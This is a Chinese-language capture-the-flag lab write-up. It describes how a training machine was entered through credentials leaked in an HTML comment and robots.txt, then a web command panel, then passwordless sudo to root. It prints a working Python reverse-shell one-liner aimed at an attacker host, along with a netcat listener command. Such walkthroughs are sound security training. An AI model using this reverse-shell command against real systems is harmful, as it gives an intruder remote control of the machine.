靶机 IP：10.49.187.159（中途异常重启，变更为 10.48.170.129）

## 一句话结论

HTML 注释里泄露了登录页面的用户名，robots.txt 里泄露了登录密码；登录后台后，Command Panel 面板可以直接执行系统命令，借此反弹 shell 进入系统；www-data 用户可以免密执行任意指令，最终提权拿到 root。

## 攻击入口

| 端口 | 服务 | 判断 |
| --- | --- | --- |
| 22 | OpenSSH 8.2p1 | 需要用户名和密码 |
| 80 | Apache httpd 2.4.41 | Web 入口，可能存在敏感目录 |

Web 信息：

- 80 页面提示要帮 Rick 找到三种配料，同时 HTML 注释里泄露了用户名。
- robots.txt 直接泄露了密码。

## 入口选择

本次靶机攻击面较少，扫出 `login.php` 并拿到凭据后，我直接登录了 Web 后台，没有走 SSH，最终成功反弹 shell。

### 反弹 shell

测试后确认可以用 Python 反弹 shell：

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.152.121",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

rlwrap nc -lvnp 4444
```
